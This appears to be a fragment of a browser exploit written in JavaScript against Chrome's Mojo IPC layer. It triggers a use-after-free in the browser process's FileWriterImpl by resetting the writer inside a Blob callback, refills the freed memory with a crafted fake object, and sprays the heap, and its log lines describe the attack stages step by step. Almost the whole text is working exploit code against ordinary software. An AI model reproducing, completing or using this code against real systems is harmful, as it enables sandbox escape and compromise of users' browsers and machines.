window.setInterval(function() {
    document.getElementById( 'bottom' ).scrollIntoView();
}, 1000);

function create_interfaces() {
    blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
    Mojo.bindInterface(blink.mojom.BlobRegistry.name, mojo.makeRequest(blob_registry_ptr).handle, "process");

    file_system_manager_ptr = new blink.mojom.FileSystemManagerPtr();
    Mojo.bindInterface(blink.mojom.FileSystemManager.name, mojo.makeRequest(file_system_manager_ptr).handle, "process");
}

function create_object_to_fill_freed_space() {
    var file_writer_impl = new DataView(new ArrayBuffer(kFileWriterImplSize));
    file_writer_impl.setBigUint64(0x08, BigInt(0x40404040000), true);
    file_writer_impl.setUint8(0x20, 1) // url.is_valid
    object_to_fill_freed_space = file_writer_impl;
}

async function file_writer(oob) {
    log('[1] Find libraries, gadgets and functions');
    find_libraries(oob);
    log('[2] Creating Mojo Interfaces for UaF');
    create_interfaces()
    log('[3] Building controllable heap in Browser process');
    create_controlled_space_in_heap();
    log('[4] Building file_writer_impl to fill freed space');
    create_object_to_fill_freed_space();

    let host_url = new url.mojom.Url();
    host_url.url = window.location.href;
    let open_result = await file_system_manager_ptr.open(host_url, 0);
    let file_url = new url.mojom.Url();
    file_url.url = open_result.rootUrl.url + '/aaaa';
    var create_writer_result = await file_system_manager_ptr.createWriter(file_url);
    async function register_blob_0() {
        log('[?] Trigger UaF on FileWriterImpl');
        function BytesProviderImpl() {
            this.binding = new mojo.Binding(blink.mojom.BytesProvider, this);
        }
        let bytes_provider = new BytesProviderImpl();
        let bytes_provider_ptr = new blink.mojom.BytesProviderPtr();
        bytes_provider.binding.bind(mojo.makeRequest(bytes_provider_ptr));  
        let blob_ptr = new blink.mojom.BlobPtr();
        let blob_req = mojo.makeRequest(blob_ptr);
        let data_element = new blink.mojom.DataElement();
        data_element.bytes = new blink.mojom.DataElementBytes();
        data_element.bytes.length = 1;
        data_element.bytes.embeddedData = [0];
        data_element.bytes.data = bytes_provider_ptr;
        await blob_registry_ptr.register(blob_req, 'blob_0', "text/html", "", [data_element]);
        return blob_ptr;
    }
    function Blob0Impl() {
        this.binding = new mojo.Binding(blink.mojom.Blob, this);
    }
    Blob0Impl.prototype = {
        getInternalUUID: async (arg0) => {
            log('[!] Trigger free on FileWriterImpl');
            create_writer_result.writer.ptr.reset();
            log('[!] Trigger fill on freed FileWriterImpl');
            for (var i = 0; i < kAllocationCount; ++i) {
                controlled_heap_space[i].malloc(object_to_fill_freed_space.buffer);
            }
            log('[!] Trigger spray');
            spray(oob);
            register_blob_0();
            return {'uuid': 'blob_0'};
        }
    };
    let blob_impl = new Blob0Impl();
    let blob_impl_ptr = new blink.mojom.BlobPtr();
    blob_impl.binding.bind(mojo.makeRequest(blob_impl_ptr));
    create_writer_result.writer.write(0, blob_impl_ptr);
    return;
}